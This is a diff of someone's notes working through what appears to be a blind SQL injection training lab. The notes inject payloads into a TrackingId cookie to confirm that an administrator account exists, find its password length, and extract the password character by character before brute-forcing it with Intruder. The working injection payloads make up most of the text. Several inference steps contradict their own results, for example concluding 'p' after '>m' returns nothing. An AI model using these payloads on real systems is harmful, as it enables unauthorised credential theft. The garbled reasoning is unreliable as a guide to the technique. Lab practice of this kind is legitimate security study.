@@ -3,9 +3,33 @@ in the request i found a cookie named TrackingId:
    when TrackingId=saSMWxiLxFjpqCgC'+and+'1'='2  ==> welcome back disappears
 ==> there is Blind SQL injection 
 
-2. test case:
-    - TrackingId=saSMWxiLxFjpqCgC'+and+substring(select+password+from+users+where+username+%3d+'administrator',1,1)+>+'m
+2. check username existance:
+   - '+and+(select+'a'+from+users+where+username+=+'administrator')+=+'a
+=> if returned result then administor exists else it does exist
+
+3. check password length:
+   - '+and+(select+'a'+from+users+where+username+=+'administrator'+and+length(password)>1)+=+'a  -> returned response
+   - '+and+(select+'a'+from+users+where+username+=+'administrator'+and+length(password)>10)+=+'a -> returned response
+   - '+and+(select+'a'+from+users+where+username+=+'administrator'+and+length(password)>=20)+=+'a -> returned response
+   - '+and+(select+'a'+from+users+where+username+=+'administrator'+and+length(password)>=25)+=+'a -> no return
+   - '+and+(select+'a'+from+users+where+username+=+'administrator'+and+length(password)=20)+=+'a  -> returned response
+   ==> password length is 20
+
+4. test case:
+    - TrackingId=saSMWxiLxFjpqCgC'+and+substring((select+password+from+users+where+username='administrator'), 1, 1)>'m  -> no return
     ==> first caracter isnt greater then m
-    - TrackingId=saSMWxiLxFjpqCgC'+and+substring(select+password+from+users+where+username+%3d+'administrator',1,1)+>+'a
-    ==> not greater then a
-    -'+and+substring(select+'a'+from+users+where+username+%3d+'administrator',1,1)+=+'a'#
+    - TrackingId=saSMWxiLxFjpqCgC'+and+substring((select+password+from+users+where+username='administrator'), 1, 1)>'a  -> returned Welcome message
+    ==> greater then a
+    - '+and+substring((select+password+from+users+where+username='administrator'), 1, 1)>'f  -> returned Welcome message
+    ==> greater then f and lower then m 
+    - '+and+substring((select+password+from+users+where+username='administrator'), 1, 1)>'i  -> returned Welcome message
+    ==> lower then i
+    - '+and+substring((select+password+from+users+where+username='administrator'), 1, 1)='p  -> return Welcome message
+    ===> first character is p
+
+5. brute force:
+   i will try every character from a-z and 0-9 for every case 1-20th letter until i find the password and we be hundled by
+   the intruder
+   - payload type: brute force 
+   - character set: a-z + 0-9
+   password: psvub3wfvk2tyeovqpsk
